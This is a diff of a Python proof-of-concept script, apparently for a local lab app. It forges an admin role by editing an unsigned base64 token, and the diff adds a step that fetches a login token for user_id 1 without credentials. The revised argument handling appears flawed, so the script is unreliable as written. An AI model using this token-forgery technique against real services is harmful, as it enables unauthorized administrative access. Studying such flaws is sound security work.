@@ -3,20 +3,21 @@ import json
 import base64
 import requests
 
-TARGET_URL = 'http://localhost:5000/access_admin'
+TARGET_URL_ADMIN = 'http://localhost:5000/access_admin'
+TARGET_URL_LOGIN = 'http://localhost:5000/login'
 
 def main():
     if len(sys.argv) < 2:
-        print("No argument provided. Please provide the token string to modify.")
-        return
+        print("No argument provided. Attempting to retrieve token for user_id = 1.\n")
+        full_token = get_auth_token('1')
     elif len(sys.argv) > 2:
-        print('Ignoring additional arguments.')
+        print(f'Using token {sys.argv[1]}.\n')
+        full_token = sys.argv[1]
 
-    incoming_token = sys.argv[1]
-    user_data = json.loads(base64.b64decode(incoming_token).decode())
+    user_data = json.loads(base64.b64decode(full_token).decode())
 
     print(f'\nFor user {user_data.get('user_name')}:')
-    try_access_admin(incoming_token)
+    try_access_admin(full_token)
 
     print(f'\n\nModifying data:\n{user_data}')
     user_data.update({'role':'admin'})
@@ -28,6 +29,27 @@ def main():
     print(f'Retrying with new token. . .')
     try_access_admin(new_token)
 
+def get_auth_token(user_id):
+    '''
+    Attempt to get the access token for a specific user.
+    '''
+    data = {
+        'user_id' : str(user_id)
+    }
+    headers = {
+        'Content-Type' : 'application/json'
+    }
+
+    try:
+        response = requests.post(TARGET_URL_LOGIN, headers=headers, json=data)
+        data = response.json()
+        auth_token = data.get('authToken')
+    except Exception as e:
+        print(f'get_auth_token: Error: {e}')
+
+    print(f'Server has responded. {auth_token}')
+    return auth_token
+
 def try_access_admin(authToken):
     '''
     Try to access the admin panel on the backend server.
@@ -38,7 +60,7 @@ def try_access_admin(authToken):
     }
 
     try:
-        response = requests.get(TARGET_URL, headers=headers)
+        response = requests.get(TARGET_URL_ADMIN, headers=headers)
         data = response.json()
     except Exception as e:
         print(f'try_access_admin: Error: {e}')
